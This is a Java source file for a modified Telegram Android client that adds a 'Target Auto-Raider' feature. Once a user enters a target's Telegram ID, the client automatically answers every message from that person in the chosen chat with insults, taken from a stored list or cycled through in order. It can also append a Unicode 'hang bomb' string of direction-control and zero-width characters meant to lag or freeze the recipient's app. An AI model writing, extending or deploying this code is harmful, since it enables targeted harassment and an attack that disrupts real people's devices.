package org.telegram.messenger;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.text.InputType;
import android.text.TextUtils;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;
import org.telegram.tgnet.TLRPC;
import org.telegram.ui.ActionBar.AlertDialog;
import org.telegram.ui.ChatActivity;
import java.util.Random;

public class TargetAutoRaider {

    // Unicode lag payload for non-immune clients
    public static final String HANG_PAYLOAD = "\u200E\u200F\u061C\u202E\u200E\u200F\u061C\u202E\u00A0\u00A0\u00A0\u00A0\u00A0\u00A0\u200B\u200C\u200D\uFEFF\u061C\u200E\u200F\u202E\u00A0\u00A0\u00A0\u00A0\u00A0\u200B\u200C\u200D\uFEFF\u202E\u200E\u200F";

    private static SharedPreferences getPrefs() {
        try {
            return MessagesController.getGlobalMainSettings();
        } catch (Throwable e) {
            return null;
        }
    }

    public static boolean isTargetRaidEnabled() {
        try {
            SharedPreferences prefs = getPrefs();
            return prefs != null && prefs.getBoolean("target_raid_active", false);
        } catch (Throwable ignored) {}
        return false;
    }

    public static long getTargetUserId() {
        try {
            SharedPreferences prefs = getPrefs();
            return prefs != null ? prefs.getLong("target_raid_uid", 0) : 0;
        } catch (Throwable ignored) {}
        return 0;
    }

    public static long getTargetChatId() {
        try {
            SharedPreferences prefs = getPrefs();
            return prefs != null ? prefs.getLong("target_raid_chat_id", 0) : 0;
        } catch (Throwable ignored) {}
        return 0;
    }

    public static void onNewMessageReceived(int currentAccount, MessageObject messageObject) {
        if (messageObject == null || messageObject.isOut() || !isTargetRaidEnabled()) {
            return;
        }

        long senderId = messageObject.getFromChatId();
        long targetUid = getTargetUserId();
        long targetChatId = getTargetChatId();

        if (targetUid == 0 || senderId != targetUid) {
            return;
        }

        long dialogId = messageObject.getDialogId();
        if (targetChatId != 0 && dialogId != targetChatId) {
            return;
        }

        SharedPreferences prefs = getPrefs();
        if (prefs == null) return;

        String savedLines = prefs.getString("target_raid_lines", "Aukat me reh bete!\nBeta baap se ladega?\nChup chap nikal le yahan se!");
        boolean isRandom = prefs.getBoolean("target_raid_random", true);
        boolean appendHang = prefs.getBoolean("target_raid_hang", false);

        String[] lines = savedLines.split("\n");
        if (lines.length == 0) return;

        String selectedLine;
        if (isRandom) {
            selectedLine = lines[new Random().nextInt(lines.length)].trim();
        } else {
            int seq = prefs.getInt("target_raid_seq", 0);
            selectedLine = lines[seq % lines.length].trim();
            prefs.edit().putInt("target_raid_seq", seq + 1).apply();
        }

        if (appendHang) {
            selectedLine += " " + HANG_PAYLOAD;
        }

        final String replyText = selectedLine;

        // Send instant automated reply
        AndroidUtilities.runOnUIThread(() -> {
            SendMessagesHelper.SendMessageParams params = SendMessagesHelper.SendMessageParams.of(replyText, dialogId);
            params.replyToMsg = messageObject;
            SendMessagesHelper.getInstance(currentAccount).sendMessage(params);
        });
    }

    public static void showTargetRaidDialog(Activity activity, ChatActivity chatActivity) {
        if (activity == null || chatActivity == null) return;

        SharedPreferences prefs = getPrefs();
        boolean isActive = isTargetRaidEnabled();
        long currentUid = getTargetUserId();
        String currentLines = prefs != null ? prefs.getString("target_raid_lines", "Aukat me reh bete!\nBeta baap se ladega?\nChup chap nikal le yahan se!") : "";
        boolean isHang = prefs != null && prefs.getBoolean("target_raid_hang", false);

        if (isActive) {
            AlertDialog.Builder builder = new AlertDialog.Builder(activity);
            builder.setTitle("🎯 Target Auto-Raider ACTIVE");
            builder.setMessage("Target User ID: " + currentUid + "\n\nAuto-reply is active. Whenever this user speaks in this chat, they will be automatically roasted!");
            builder.setPositiveButton("STOP TARGET RAID", (dialog, which) -> {
                if (prefs != null) prefs.edit().putBoolean("target_raid_active", false).apply();
                Toast.makeText(activity, "Target Raider Deactivated!", Toast.LENGTH_SHORT).show();
            });
            builder.setNegativeButton("Keep Running", null);
            builder.show();
            return;
        }

        LinearLayout layout = new LinearLayout(activity);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(AndroidUtilities.dp(20), AndroidUtilities.dp(10), AndroidUtilities.dp(20), AndroidUtilities.dp(10));

        final EditText uidInput = new EditText(activity);
        uidInput.setHint("Target User Telegram ID");
        uidInput.setInputType(InputType.TYPE_CLASS_NUMBER);
        if (currentUid != 0) uidInput.setText(String.valueOf(currentUid));
        layout.addView(uidInput);

        final EditText linesInput = new EditText(activity);
        linesInput.setHint("Enter Custom Gaali / Rebuttal Lines (1 line per message)");
        linesInput.setMinLines(4);
        linesInput.setText(currentLines);
        layout.addView(linesInput);

        final CheckBox hangCheck = new CheckBox(activity);
        hangCheck.setText("Attach Anti-Lag/Hang Bomb Payload to each reply");
        hangCheck.setChecked(isHang);
        layout.addView(hangCheck);

        AlertDialog.Builder builder = new AlertDialog.Builder(activity);
        builder.setTitle("🎯 Target Auto-Raider Setup");
        builder.setView(layout);
        builder.setPositiveButton("ACTIVATE TARGET RAID", (dialog, which) -> {
            String uidStr = uidInput.getText().toString().trim();
            String linesStr = linesInput.getText().toString().trim();

            if (TextUtils.isEmpty(uidStr)) {
                Toast.makeText(activity, "Please enter target user ID", Toast.LENGTH_SHORT).show();
                return;
            }

            long uid = 0;
            try {
                uid = Long.parseLong(uidStr);
            } catch (Exception ignored) {}

            if (uid == 0) {
                Toast.makeText(activity, "Invalid User ID", Toast.LENGTH_SHORT).show();
                return;
            }

            if (TextUtils.isEmpty(linesStr)) {
                linesStr = "Aukat me reh bete!\nBeta baap se ladega?\nChup chap nikal le yahan se!";
            }

            if (prefs != null) {
                prefs.edit()
                    .putBoolean("target_raid_active", true)
                    .putLong("target_raid_uid", uid)
                    .putLong("target_raid_chat_id", chatActivity.getDialogId())
                    .putString("target_raid_lines", linesStr)
                    .putBoolean("target_raid_hang", hangCheck.isChecked())
                    .apply();
            }

            Toast.makeText(activity, "🎯 Target Raider ACTIVE on User ID " + uid + "! Whenever they message, auto-replies will fire!", Toast.LENGTH_LONG).show();
        });
        builder.setNegativeButton(LocaleController.getString(R.string.Cancel), null);
        builder.show();
    }
}
